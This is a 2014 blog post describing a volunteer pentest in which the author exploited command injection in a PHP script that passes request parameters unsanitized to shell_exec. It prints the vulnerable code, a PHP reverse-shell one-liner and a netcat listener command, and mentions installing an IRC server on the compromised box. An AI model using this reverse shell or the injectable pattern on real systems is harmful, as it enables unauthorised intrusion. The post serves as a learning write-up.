Title: Website input command injection
Date: 2014-10-02 21:00
Tags: hacking, security 
Slug: php_exec
Category: InfoSec
Author: David Mitchell
Summary: How running php_exec on raw unsanitized inputs is a good way to get shells on your box

Someone recently asked for a free pentest in a private security related 
group for a site they had been working on for a while before it went live. 
Some of us guys at [FALE](http://lockfale.com) obliged. Since it was a 
free pentest, I am taking the liberty to post about it. It was 
actually my first shell and first box I've popped that wasn't mine. So
it was a learning opportunity for me with some subtle direction by those
more experienced.

The way it worked was basically, using Burp Suite, I was able to look at
the requests made by my browser to the site, then it was a matter of trying
various inputs on some of the fields it accepted. This one in particular
took a post for an ip field that was set in a hidden field. Below is the
php code from the site URL we grabbed once we were in.

     <?php
        header('Content-Type: text/json');
        echo shell_exec('curl "http://'.$_GET['ip'].'/api/Search?category='.$_GET['category'].'&term='.urlencode($_GET['term']).'"');
     ?>

As you can see it's running a straight up shell_exec on a curl command with
the ip header field injected with no sanitization or checking format. So 
it was a simple matter of changing the header field in burp to a [remote 
shell command](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). 
PHP worked for obvious reasons, it was already installed.

     `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
     
I of course, first setup a simple listener using netcat on the host with 
the IP in the above command.

     netcat -l -p 1234

and boom, free shells. The machine was pretty well locked down, so escalation
from there wasn't done, and its a free pentest so we're only going to put
so much effort into it. All the same, we had some fun by attempting to 
setup a Minecraft server, turned out the box didn't have enough memory, so
we settled for setting up an IRC server.
